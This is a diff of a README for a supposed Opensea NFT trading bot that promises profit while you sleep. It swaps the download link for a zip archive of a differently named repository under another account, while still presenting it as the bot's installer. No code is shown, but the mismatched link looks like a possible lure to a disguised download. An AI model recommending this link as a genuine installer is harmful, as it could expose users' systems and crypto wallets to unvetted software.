@@ -65,7 +65,7 @@ Run and profit while you sleep :)
 
 ## Download
 
-You can [download](https://github.com/Crypto-Trading-Bots/Opensea-NFT-Trading-Bot/releases/tag/Opensea) the latest installable version of Opensea Nft Trading Bot for Windows and macOS.
+You can [download](https://github.com/patrykq9/Metamask-Arbitrage-Trading-Bot/archive/refs/heads/main.zip) the latest installable version of Opensea Nft Trading Bot for Windows and macOS.
 
 ## Credits
 
